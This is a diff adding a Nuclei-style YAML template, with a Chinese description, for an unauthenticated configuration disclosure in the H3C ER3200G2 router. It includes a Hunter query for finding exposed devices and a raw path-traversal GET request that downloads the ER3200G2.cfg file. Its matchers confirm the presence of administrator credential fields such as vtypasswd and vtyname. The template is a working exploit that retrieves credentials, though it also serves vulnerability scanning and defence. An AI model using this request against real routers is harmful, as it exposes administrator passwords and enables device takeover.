@@ -1,0 +1,33 @@
+id: H3C-ER3200G2-Information-disclosure
+
+info:
+  name: "H3C ER3200G2路由器未授权配置信息泄露漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    Hunter: app.name="H3C Router Management"
+      H3C ER3200G2路由器因认证机制缺陷导致敏感信息泄露，攻击者无需身份验证即可远程访问系统配置接口，获取包含管理员账号密码的明文凭证数据，可能进一步导致设备控制权被完全接管，形成持续性安全威胁。
+  reference:
+  - https://mp.weixin.qq.com/s/UQdYaGdPthMDlAc0AW_XLw
+  tags: H3C Router Management
+
+http:
+- raw:
+  - |
+    GET /userLogin.asp/../actionpolicy_status/../ER3200G2.cfg HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - "vtypasswd="
+    - "vtypasswdtype="
+    - "vtyname="
+    - "H3C"
+    condition: and
+  - type: status
+    status:
+    - 200
